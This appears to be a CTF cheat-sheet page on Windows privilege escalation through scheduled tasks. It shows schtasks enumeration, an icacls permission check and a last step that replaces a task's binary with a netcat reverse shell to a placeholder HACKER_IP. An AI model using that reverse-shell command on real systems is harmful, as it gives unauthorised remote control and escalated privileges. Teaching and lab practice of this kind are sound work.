# Scheduled tasks

[Go back](../index.md#windows-privilege-escalation-)

[![windowsprivesc20](../../../_badges/thmp/windowsprivesc20.svg)](https://tryhackme.com/room/windowsprivesc20)

<div class="row row-cols-md-2"><div>

List scheduled tasks

```shell!
PS> schtasks
```

Query more info on a task <small>(ex: `example_task`)</small> with:

```shell!
PS> schtasks /query /tn example_task /fo list /v
```

When inspecting tasks, look for the binary in **Task To Run**. You may be able to **replace**, **edit** or **inject** some code in the binary.

* Check your [permissions](/operating-systems/windows/knowledge/index.md#permissions-and-users)

```shell!
PS> icacls task_to_run
```
</div><div>

➡️ During CTFs, you may be given the permissions to restart the task, otherwise you will have to wait.

```shell!
PS> schtasks /run /tn taskname
```

<br>

#### Replace a task

Replace a binary executed by a task with `netcat`:

```shell!
CMD> echo %temp%\nc64.exe -e cmd.exe HACKER_IP PORT > task_to_run
```
</div></div>